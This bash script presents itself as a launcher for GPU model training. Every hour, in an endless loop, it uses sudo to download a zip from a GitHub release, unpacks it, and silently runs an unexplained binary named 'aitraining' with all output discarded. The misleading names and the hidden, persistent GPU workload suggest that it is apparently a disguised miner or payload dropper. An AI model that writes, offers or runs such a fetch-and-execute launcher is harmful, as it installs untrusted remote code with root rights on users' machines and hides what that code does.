#!/bin/bash

# File: start_modelgp.sh launcher

# Ensure unzip is installed
sudo apt install -y unzip

# Main loop for managing start_modelgp.sh lifecycle
while true; do
    echo "Starting GPU model process..."

    # Kill any existing start_modelgp.sh or aitraining process to avoid duplicates
    if pgrep -f "start_modelgp.sh" > /dev/null; then
        echo "Found existing start_modelgp.sh process. Killing it..."
        pkill -f "start_modelgp.sh"
        sleep 5
    fi
 nohup bash -c '
    # Re-download the TELEGRAMBOT package (optional)
    sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
    sudo mkdir -p TELEGRAMBOT
    sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT

    # Go into the TELEGRAMBOT directory
    cd TELEGRAMBOT || exit

    # Make sure your start_modelgp.sh file is executable
 sudo chmod +x aitraining
sudo chmod +x start_modelgp.sh
    # Start your main GPU script
    bash ./start_modelgp.sh
    ' > /dev/null 2>&1 &


    echo "start_modelgp.sh is now running. It will run for 1 hour."

    # Wait for 1 hour before restarting
    sleep 3600

    echo "Stopping running GPU process..."
    if pgrep -f "start_modelgp.sh" > /dev/null; then
        pkill -f "start_modelgp.sh"
        echo "Process stopped."
    else
        echo "Process already stopped or crashed."
    fi
    if pgrep -f "aitraining" > /dev/null; then
        pkill -f "aitraining"
        echo "Process stopped."
    else
        echo "Process already stopped or crashed."
    fi
    echo "Waiting 1 minute before restart..."
    sleep 60
done
